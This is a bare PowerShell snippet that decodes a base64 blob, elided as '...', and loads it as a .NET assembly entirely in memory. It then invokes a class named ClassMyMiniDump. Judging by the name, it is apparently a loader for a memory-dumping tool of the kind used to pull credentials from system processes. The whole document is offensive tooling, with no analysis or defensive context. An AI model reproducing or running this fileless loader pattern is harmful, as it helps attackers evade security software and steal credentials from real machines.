$b64 = "..."
[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
[ClassMyMiniDump.Class1]::runner()
